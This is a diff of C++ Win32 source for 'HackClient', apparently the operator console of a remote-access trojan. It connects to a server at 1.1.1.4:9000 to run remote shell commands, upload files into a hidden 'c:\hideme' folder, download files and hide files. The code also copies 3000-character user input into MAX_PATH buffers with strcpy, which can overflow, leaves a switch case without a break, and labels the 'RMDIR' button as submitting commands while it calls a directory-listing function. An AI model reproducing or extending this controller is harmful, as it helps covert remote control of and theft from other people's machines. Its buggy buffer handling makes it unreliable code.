@@ -2,8 +2,10 @@
 //#include <windows.h>
 #include<Shlobj.h>
 #include<string.h>
+#include<shlwapi.h>
 //#pragma comment(lib,"Shlobj.lib")
 #pragma warning( disable : 4091 )
+
 void HackClient::Init(HWND hwnd){
 
 	int button_x = BUTTON_X;
@@ -24,9 +26,7 @@ void HackClient::Init(HWND hwnd){
 	
 	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;
 
-	hwndbutton[BUTTON_FILE_DOWNLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,		
-		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
-	SetWindowText(hwndbutton[BUTTON_FILE_DOWNLOAD],"下载文件");
+	
 
 	hwndbutton[BUTTON_SHELL_WINDOW]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE|ES_READONLY,
 		SHELL_X,SHELL_Y,SHELL_WIDTH,SHELL_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
@@ -43,36 +43,37 @@ void HackClient::Init(HWND hwnd){
 	
 	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;
 
-	hwndbutton[BUTTON_FILE_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
+	hwndbutton[BUTTON_FILE_DOWNLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,		
 		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
-	SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"文件隐藏");
+	SetWindowText(hwndbutton[BUTTON_FILE_DOWNLOAD],"下载文件");
 	
 	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;
 
 	hwndbutton[BUTTON_SHELL_INPUT]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE,
-		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
+		button_x/2,button_y,2*BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
 	SetWindowText(hwndbutton[BUTTON_SHELL_INPUT],"SHELL输入窗口");
 
 
 	//第三列
 	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
 	button_y = BUTTON_Y;
-
-	hwndbutton[BUTTON_SHELL_LS] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
+	hwndbutton[BUTTON_FILE_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
 		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
-	SetWindowText(hwndbutton[BUTTON_SHELL_LS],"LS");
+	SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"文件隐藏");
+	/*hwndbutton[BUTTON_SHELL_LS] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
+		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
+	SetWindowText(hwndbutton[BUTTON_SHELL_LS],"LS");*/
 	
 	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;
 
-	hwndbutton[BUTTON_SHELL_MKDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
-		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
-	SetWindowText(hwndbutton[BUTTON_SHELL_MKDIR],"MKDIR");
-
+		hwndbutton[BUTTON_SHELL_INPUT_2]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE,
+		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
+	    SetWindowText(hwndbutton[BUTTON_SHELL_INPUT_2],"下载文件路径");
 	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;
 
 	hwndbutton[BUTTON_SHELL_RMDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
 		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
-	SetWindowText(hwndbutton[BUTTON_SHELL_RMDIR],"RMDIR");
+	SetWindowText(hwndbutton[BUTTON_SHELL_RMDIR],"提交指令");
 	
 	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;
 
@@ -113,8 +114,8 @@ void HackClient::CommandExecute(HWND hwnd,int dir){
 	{
 	case BUTTON_CLIENT_LINK:
 		//初始化socket
-		mc = new MLHT_CLIENT("127.0.0.1",9000);
-		//mc = new MLHT_CLIENT("1.1.1.4",9000);
+		//mc = new MLHT_CLIENT("127.0.0.1",9000);
+		mc = new MLHT_CLIENT("1.1.1.4",9000);
 		//连接socket服务端
 		if(mc->ConnectServer())
 			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"LINK SERVER SUCCESSFUL.");
@@ -137,10 +138,16 @@ void HackClient::CommandExecute(HWND hwnd,int dir){
 			ofn.nMaxFile = sizeof(uploadFilename)/sizeof(*uploadFilename);
 			ofn.nFilterIndex = 0;
 			ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_EXPLORER ;//标志如果是多选要加上OFN_ALLOWMULTISELECT
-
+            TCHAR a[MAX_PATH] = "c:\\hideme";
+			TCHAR b[MAX_PATH]={0};
+			//PathStripPath(uploadFilename);
 			if(GetOpenFileName(&ofn)){
+				TCHAR f[MAX_PATH]={0};
+				strcpy(f,strrchr(uploadFilename,'\\'));
+				strcat(a,f);
+				
 				//if(mc->UpLoadFile(uploadFilename,GetFilename(uploadFilename))==PACKET_ACCEPT_SUCCESS){
-				if(mc->UpLoadFile(uploadFilename,"d:\\hideme\\test.txt")==PACKET_ACCEPT_SUCCESS){
+				if(mc->UpLoadFile(uploadFilename,a)==PACKET_ACCEPT_SUCCESS){
 					wsprintf(str,"上传文件路径：%s",uploadFilename);
 					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
 				}
@@ -153,9 +160,11 @@ void HackClient::CommandExecute(HWND hwnd,int dir){
 	case BUTTON_FILE_DOWNLOAD:
 		{
 			TCHAR str[MAX_PATH] = {0};
-
-			TCHAR downloadFilename[MAX_PATH] = "d:\\hideme\\test.txt";
-
+			//TCHAR str_2[3000] = {0};
+			TCHAR s[3000] = {0};
+			GetWindowText(hwndbutton[BUTTON_SHELL_INPUT_2],s,sizeof(s));
+			TCHAR downloadFilename[MAX_PATH] = {0};
+			strcpy(downloadFilename, s);
 			TCHAR downloadFileDir[MAX_PATH] = {0};
 			BROWSEINFO bi;
 			ZeroMemory(&bi,sizeof(BROWSEINFO)); 
@@ -212,17 +221,9 @@ void HackClient::CommandExecute(HWND hwnd,int dir){
 	case BUTTON_SHELL_INPUT:
 		{
 			TCHAR str[3000] = {0};
-			//char a[MAX_PATH]={0};
-
-
-
-			TCHAR filedir[MAX_PATH] = "C:\\hideme";
-			if(mc->ShellLs(filedir)==PACKET_ACCEPT_SUCCESS){
-				//wsprintf(str,"%s文件目录为：\r\n%s",filedir,mc->p_get->GetPacketContent());
-				wsprintf(str,"%s",mc->p_get->GetPacketContent());
-				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
-			}
-			break;
+			GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],str,sizeof(str));
+			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
+			
 		}
 	case BUTTON_SHELL_LS:
 		{
@@ -255,19 +256,23 @@ void HackClient::CommandExecute(HWND hwnd,int dir){
 		}
 		break;
 	case BUTTON_SHELL_RMDIR:
-		{
-			TCHAR str[10000] = {0};
+		{   TCHAR str[3000] = {0};
+			TCHAR s[3000] = {0};
+			GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],s,sizeof(s));
+			//SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],s);
+			
 
-			TCHAR filedir[MAX_PATH] = "d:\\hideme\\deleteme";
-			if(mc->ShellRmdir(filedir)==PACKET_ACCEPT_SUCCESS){
-				wsprintf(str,"已删除文件目录：\r\n%s",filedir);
+			//TCHAR filedir[MAX_PATH] = {0};
+			//filedir=str;
+			if(mc->ShellLs(s)==PACKET_ACCEPT_SUCCESS){
+                wsprintf(str,"%s",mc->p_get->GetPacketContent());
 				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
 			}
 			else
-				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"删除文件目录失败");
+				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"输的啥鬼命令");
 		}
 		break;
-	case BUTTON_SHELL_RM:
+	/*case BUTTON_SHELL_RM:
 		{
 			TCHAR str[MAX_PATH] = {0};
 
@@ -279,7 +284,7 @@ void HackClient::CommandExecute(HWND hwnd,int dir){
 			else
 				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"删除文件失败");
 		}
-		break;
+		break;*/
 	default:
 		break;
 	}
